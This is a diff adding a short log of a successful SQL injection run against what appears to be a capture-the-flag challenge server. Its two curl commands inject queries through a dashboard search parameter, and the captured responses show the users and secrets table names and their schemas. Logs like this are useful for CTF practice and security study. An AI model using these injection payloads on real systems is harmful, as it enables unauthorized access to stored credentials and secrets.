@@ -1,0 +1,19 @@
+# Captured: 2026-10-10 19:25 UTC (successful run)
+
+$ curl -sS -k -b cookies.txt --get \
+    'https://kicyber-81cdac2d8817-devnote-0-0.chals.io/dashboard' \
+    --data-urlencode "q=group_concat(name) FROM sqlite_master WHERE type='table'"
+<pre>[{&#39;group_concat(name)&#39;: &#39;users,secrets&#39;}]</pre>
+
+$ curl -sS -k -b cookies.txt --get \
+    'https://kicyber-81cdac2d8817-devnote-0-0.chals.io/dashboard' \
+    --data-urlencode "q=group_concat(name||':'||sql, char(10)) FROM sqlite_master"
+<pre>[{"group_concat(name||':'||sql, char(10))": "users:CREATE TABLE users (
+                id INTEGER PRIMARY KEY,
+                username TEXT,
+                password TEXT
+            )
+secrets:CREATE TABLE secrets (
+                id INTEGER PRIMARY KEY,
+                data TEXT
+            )"}]</pre>
